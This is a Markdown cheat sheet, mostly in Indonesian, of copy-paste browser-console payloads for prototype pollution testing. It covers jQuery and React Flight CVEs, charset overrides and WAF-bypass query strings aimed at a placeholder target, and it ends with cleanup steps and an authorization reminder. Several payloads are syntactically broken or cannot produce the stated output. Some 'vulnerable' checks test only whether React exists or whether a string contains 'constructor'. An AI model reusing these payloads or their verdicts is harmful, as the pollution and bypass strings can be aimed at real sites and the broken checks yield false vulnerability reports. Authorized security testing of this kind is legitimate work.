# 🚀 PPMAP Manual Testing - Copy-Paste Payload Cheat Sheet

> Gunakannya: Buka F12 → Console tab → Copy-paste code di bawah

---

## ✅ TEST 1: jQuery Prototype Pollution (CVE-2019-11358)

### Payload #1 - Basic Pollution Test
```javascript
// COPY & PASTE INI KE CONSOLE:
$.extend(true, {}, {"__proto__": {"polluted": "YES"}});

// KEMUDIAN JALANKAN INI UNTUK VERIFIKASI:
Object.prototype.polluted

// EXPECTED OUTPUT:
// "YES"  ← Jika keluar "YES" = VULNERABLE! ✓
```

**Cara Membaca Output:**
- Jika keluar `"YES"` = **VULNERABLE** ✓
- Jika keluar `undefined` = tidak vulnerable

---

### Payload #2 - Override toString
```javascript
// Inject payload:
$.extend(true, {}, {"__proto__": {"toString": function(){return "HACKED"}}});

// Verify:
({}).toString()

// EXPECTED:
// "HACKED"  ← Jika output "HACKED" = VULNERABLE! ✓
```

---

### Payload #3 - Check Global Pollution
```javascript
// Check property names:
Object.getOwnPropertyNames(Object.prototype).includes('polluted')

// EXPECTED:
// true  ← Jika true = VULNERABLE! ✓
```

---

## ✅ TEST 2: Function.prototype Chain Pollution

### Payload #1 - Constructor.constructor.prototype
```javascript
// Inject:
constructor.constructor.prototype.polluted = "HACKED"

// Verify:
({}).polluted

// EXPECTED:
// "HACKED"  ← Output ini = VULNERABLE! ✓
```

---

### Payload #2 - Direct __proto__ Access
```javascript
// Inject:
({})._\_\_proto\_\_\_.constructor.prototype.test = "polluted"

// Verify:
({}).test

// EXPECTED:
// "polluted"  ← VULNERABLE! ✓
```

---

### Payload #3 - Function Array Override
```javascript
// Inject ke prototype:
Object.getPrototypeOf(Object.getPrototypeOf(Object.getPrototypeOf([]))).map = function(){
  console.log("PROTOTYPE HIJACKED!")
  return []
}

// Trigger:
[1,2,3].map(x => x)

// EXPECTED:
// console.log shows: PROTOTYPE HIJACKED!  ← VULNERABLE! ✓
```

---

## ✅ TEST 3: React Flight Protocol (CVE-2025-55182)

### Payload #1 - Check React Exists
```javascript
typeof React !== 'undefined' ? "REACT FOUND - VULNERABLE" : "React not present"

// EXPECTED:
// "REACT FOUND - VULNERABLE"  ← VULNERABLE! ✓
```

---

### Payload #2 - Flight Protocol Deserialization
```javascript
// Create payload:
const payload = {
  "_formData": {
    "get": "$1:then:constructor"
  }
}

// Stringify untuk lihat:
JSON.stringify(payload)

// Then access:
payload._formData.get

// EXPECTED:
// "$1:then:constructor"  ← Constructor chain accessible = VULNERABLE! ✓
```

---

### Payload #3 - Flight RCE Check
```javascript
// Coba akses constructor:
const obj = JSON.parse('{"_formData": {"get": "$1:then:constructor"}}')
typeof obj._formData.get === "string" && obj._formData.get.includes("constructor")

// EXPECTED:
// true  ← VULNERABLE! ✓
```

---

## ✅ TEST 4: UTF-7 Charset Override

### Payload #1 - Inject Charset via Prototype
```javascript
// Inject:
Object.prototype.charset = "utf-7"

// Verify:
document.charset

// EXPECTED:
// "utf-7"  ← Charset overridden = VULNERABLE! ✓
```

---

### Payload #2 - Check ISO-2022 Bypass
```javascript
// Inject:
Object.prototype.encoding = "iso-2022-jp"

// Verify:
document.characterSet || document.charset

// EXPECTED:
// bisa berubah ke iso-2022-jp = VULNERABLE! ✓
```

---

### Payload #3 - Meta Charset Test
```javascript
// Get current meta charset:
document.querySelector('meta[charset]')?.getAttribute('charset')

// EXPECTED:
// Bisa di-override via prototype pollution
```

---

## ✅ TEST 5: WAF Bypass Techniques

### Payload #1 - Case Variation Bypass
```javascript
// URL: http://target.com/?__PROTO__[bypass]=1
// Di console, verify:
Object.prototype.bypass

// EXPECTED:
// 1  ← WAF Bypass successful! ✓
```

### Payload #2 - URL Encoding Bypass
```javascript
// URL: http://target.com/?__proto__%5Bbypass%5D=1
// (%5B = [ dan %5D = ])
// Di console:
Object.prototype.bypass

// EXPECTED:
// 1  ← Bypass successful! ✓
```

### Payload #3 - Nested Object Bypass
```javascript
// URL: http://target.com/?a[b][__proto__][bypass]=1
// Di console:
({}).bypass

// EXPECTED:
// 1  ← Bypass successful! ✓
```

### Payload #4 - JSON Bypass
```javascript
// POST body atau JSON:
{"__proto__": {"bypass": true}}

// Di console verify:
Object.prototype.bypass

// EXPECTED:
// true  ← Bypass successful! ✓
```

---

## 📊 Verification Results Table

Setelah running semua test, isi tabel ini:

| Test | Vulnerable? | Output | Status |
|------|---|---|---|
| jQuery PP - Basic | ? | Object.prototype.polluted = ? | [ ] ✓ |
| jQuery PP - toString | ? | ({}).toString() = ? | [ ] ✓ |
| Function.proto #1 | ? | ({}).polluted = ? | [ ] ✓ |
| Function.proto #2 | ? | ({}).test = ? | [ ] ✓ |
| React Flight | ? | typeof React = ? | [ ] ✓ |
| UTF-7 Override | ? | document.charset = ? | [ ] ✓ |
| WAF Bypass #1 | ? | bypass param = ? | [ ] ✓ |
| WAF Bypass #2 | ? | bypass param = ? | [ ] ✓ |

---

## 🎯 Summary Checklist

Setelah semua test, catat hasil di sini:

```
✓ jQuery PP CRITICAL    : [ ] VULNERABLE  [ ] SAFE
✓ Function.proto HIGH   : [ ] VULNERABLE  [ ] SAFE
✓ React Flight CRITICAL : [ ] VULNERABLE  [ ] SAFE
✓ UTF-7 Bypass HIGH     : [ ] VULNERABLE  [ ] SAFE
✓ WAF Bypass HIGH       : [ ] VULNERABLE  [ ] SAFE
```

---

## 🔧 Cleanup Commands

Setelah selesai testing, jalankan ini untuk cleanup:

```javascript
// Remove all test properties:
delete Object.prototype.polluted
delete Object.prototype.test
delete Object.prototype.bypass
delete Object.prototype.charset
delete Object.prototype.encoding

// Verify cleanup:
Object.prototype.polluted
Object.prototype.test

// EXPECTED:
// undefined, undefined
```

---

## 📝 Screenshot Guide

Untuk documentation, ambil screenshot ini:

1. **Before Exploitation:**
   ```javascript
   Object.prototype.test
   // Output: undefined
   ```

2. **After Exploitation:**
   ```javascript
   $.extend(true, {}, {"__proto__": {"test": "POLLUTED"}});
   Object.prototype.test
   // Output: "POLLUTED"
   ```

---

## ⚠️ Important Notes

- ✅ Testing hanya pada **authorized systems**
- ✅ **Catat semua results** dengan timestamps
- ✅ **Jangan exploit production** tanpa written permission
- ✅ **Use headless browser** jika testing di server
- ✅ **Enable DevTools** jika belum bisa akses console

---

## 🚀 Quick Start

1. Buka target: `http://zero.webappsecurity.com/`
2. Press `F12` → Open `Console` tab
3. Copy-paste payload dari section di atas
4. Jalankan verification code
5. Catat hasil di Verification Table
6. Ulangi untuk semua test
7. Buat laporan dengan screenshot

**Done!** Anda sudah manual testing dengan sukses! 🎉

